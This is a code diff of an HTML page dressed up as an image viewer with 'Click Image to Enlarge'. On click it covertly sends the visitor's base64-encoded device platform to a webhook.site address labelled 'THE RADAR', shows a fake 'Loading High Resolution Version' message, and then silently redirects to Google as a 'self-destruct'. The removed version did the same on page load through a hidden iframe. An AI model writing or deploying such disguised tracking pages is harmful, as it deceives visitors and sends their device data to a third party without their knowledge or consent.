@@ -5,27 +5,33 @@
 </head>
 <body style="background-color: black; color: white; text-align: center; font-family: sans-serif; padding-top: 50px;">
 
+    <h2>Click Image to Enlarge</h2>
+
+    <a href="javascript:void(0)" onclick="launchPayload()" style="cursor: zoom-in;">
+        <img src="https://raw.githubusercontent.com/bluekama/project-portfolio/main/IMG_0542.PNG" 
+             style="max-width: 90%; border: 2px solid #333; margin-top: 20px;">
+    </a>
+
     <script>
-        // 1. THE RADAR (Hidden from view)
-        const radar = "https://webhook.site/8447f537-1f81-4106-885a-dc4c3809223e";
-        
-        // Create a hidden element to "ping" the radar
-        const frame = document.createElement('iframe');
-        frame.style.display = 'none';
-        frame.src = radar + "?status=captured&device=" + btoa(navigator.platform);
-        document.body.appendChild(frame);
+        function launchPayload() {
+            // 1. THE RADAR
+            const radar = "https://webhook.site/8447f537-1f81-4106-885a-dc4c3809223e";
+            
+            // Background ping
+            const ping = new Image();
+            ping.src = radar + "?event=image_click&device=" + btoa(navigator.platform);
 
-        // 2. THE SELF-DESTRUCT
-        // This timer keeps running because we never left the page
-        setTimeout(function() {
-            window.location.replace("https://www.google.com");
-        }, 10000);
+            // 2. THE VISUAL FEEDBACK
+            // We tell the user it's "loading" so they don't click twice
+            document.body.innerHTML = "<h2 style='margin-top:100px;'>Loading High Resolution Version...</h2>";
+
+            // 3. THE SELF-DESTRUCT
+            // After 3 seconds (fast enough to be smooth), jump to Google
+            setTimeout(function() {
+                window.location.replace("https://www.google.com");
+            }, 3000);
+        }
     </script>
-
-    <h2>Loading High Resolution Content...</h2>
-
-    <img src="https://raw.githubusercontent.com/bluekama/project-portfolio/main/IMG_0542.PNG" 
-         style="max-width: 90%; border: 2px solid #333; margin-top: 20px;">
 
 </body>
 </html>
